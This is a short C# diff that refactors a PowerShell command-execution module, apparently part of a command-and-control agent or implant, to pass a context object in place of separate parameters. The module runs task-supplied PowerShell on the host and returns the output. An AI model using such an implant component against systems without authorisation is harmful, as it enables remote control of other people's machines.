@@ -1,5 +1,4 @@
 ﻿using Agent.Commands.Execution;
-using Agent.Internal;
 using Agent.Models;
 using System;
 using System.Collections.Generic;
@@ -12,7 +11,7 @@ namespace Agent.Commands
     public class PowerShellCommand : AgentCommand
     {
         public override string Name => "powershell";
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
             using (var runner = new PowerShellRunner())
             {
@@ -21,7 +20,7 @@ namespace Agent.Commands
                     runner.ImportScript(PowerShellImportCommand.Script);
 
                 var command = string.Join(" ", task.Arguments);
-                result.Result = runner.Invoke(command);
+                context.Result.Result = runner.Invoke(command);
                 
             }
         }
